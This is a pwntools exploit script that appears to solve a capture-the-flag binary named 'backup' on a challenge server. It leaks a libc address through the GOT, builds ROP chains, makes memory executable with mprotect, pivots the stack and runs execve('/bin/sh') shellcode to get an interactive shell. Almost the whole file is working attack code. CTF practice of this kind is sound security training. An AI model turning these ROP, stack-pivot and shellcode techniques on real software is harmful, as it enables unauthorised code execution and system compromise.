#!/usr/bin/python

from pwn import *

context.arch = 'amd64'

PATH = './backup'

GDBSCRIPT = '''
b *0x4014dd
b *0x40158e
b *0x40156b
'''

HOST = 'challenge.ctf.games'
PORT = 30087

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def run(command):
    r.sendlineafter('$', command)

def write(offset, payload, padding = 0):
    cmd  = b'\\' * (offset - 0x37)
    cmd += payload
    cmd += b'\\' * padding
    run(cmd)

def exploit(r):
    EXIT = b'EXIT'

    payload  = p64(0x4015f3) # pop rdi ; ret
    payload += p64(elf.got['puts'])
    payload += p64(0x4010f0) # puts
    payload += p64(elf.sym['_start'])

    POP_6 = 0x4015EA
    POP_7 = 0x4015E6

    write(0x290, payload)
    write(0x250, p64(POP_7), padding = 0x10) # csu set
    write(0x218, p64(POP_6), padding = 0x10) # csu set

    run(EXIT)

    libc_puts = u64(r.recvline(0).ljust(8, b'\0'))
    libc.address = libc_puts - libc.sym['puts']

    info(hex(libc_puts))
    info(hex(libc.address))

    POP_RDI_RET = libc.address + 0x026b72
    POP_RDX_R12 = libc.address + 0x11c371
    POP_RBP_RET = libc.address + 0x0256c0
    STR_BIN_SH  = libc.address + 0x1b75aa
    LEAVE_RET   = libc.address + 0x05aa48

    BSS_TARGET = elf.bss(0x100)

    payload  = p64(POP_RDI_RET)
    payload += p64(BSS_TARGET)
    payload += p64(POP_RDX_R12 + 1) # pop r12 ; ret
    payload += p64(0xdeadbeef)
    payload += p64(libc.sym['gets'])
    payload += p64(elf.sym['_start'])
    
    write(0x228, payload)
    run(EXIT)
    
    rop = ROP(libc)
    rop.call(libc.sym['mprotect'], [elf.bss(0) - 0x10, 0x1000, 0x7])
    rop = bytes(rop)
    
    shellcode = f'''
        mov rdi, {STR_BIN_SH}
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
    '''

    r.sendline(rop + p64(BSS_TARGET + len(rop) + 8) + asm(shellcode))

    payload  = p64(POP_RBP_RET)
    payload += p64(BSS_TARGET - 0x8)
    payload += p64(LEAVE_RET)

    write(0x218, payload)
    run(EXIT)

    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    path = './libc-2.31.so'
    libc = ELF(path, checksec = False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        env = {'LD_PRELOAD' : path}
        r = process(PATH, aslr=0, env=env)
    exploit(r)
